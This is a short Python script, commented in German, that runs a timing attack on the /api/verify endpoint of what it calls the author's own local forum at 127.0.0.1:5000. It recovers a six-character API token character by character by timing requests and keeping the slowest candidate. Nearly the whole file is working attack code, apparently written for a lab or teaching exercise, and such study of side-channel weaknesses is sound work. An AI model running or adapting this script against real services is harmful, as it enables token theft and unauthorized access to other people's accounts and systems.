"""Timing-Attack gegen /api/verify des EIGENEN lokalen Cowboy-Forums.

Errät das API-Token Zeichen für Zeichen, indem es misst, bei welchem nächsten
Zeichen die Antwort am längsten dauert (= ein weiteres Zeichen war korrekt).

Nur gegen http://127.0.0.1:5000. Setup:
    pip install requests
    python attack_timing.py
"""
import statistics
import string
import time

import requests

BASE = "http://127.0.0.1:5000/api/verify"
ALPHABET = string.ascii_letters + string.digits
TOKEN_LEN = 6      # aus dem Szenario bekannt; sonst separat ermittelbar
SAMPLES = 5        # Messungen pro Kandidat (Median gegen Rauschen)


def measure(candidate: str) -> float:
    times = []
    for _ in range(SAMPLES):
        t0 = time.perf_counter()
        requests.get(BASE, params={"token": candidate})
        times.append(time.perf_counter() - t0)
    return statistics.median(times)


def main() -> None:
    known = ""
    for _ in range(TOKEN_LEN):
        best_char, best_time = None, -1.0
        for ch in ALPHABET:
            # Rest mit 'x' auffüllen, damit die Länge stimmt.
            guess = (known + ch).ljust(TOKEN_LEN, "x")
            dt = measure(guess)
            if dt > best_time:
                best_time, best_char = dt, ch
        known += best_char
        print(f"bisher: {known!r}  (langsamster nächster Buchstabe = korrekt)")
    print(f"\n[+] Vermutetes Token: {known!r}")


if __name__ == "__main__":
    main()
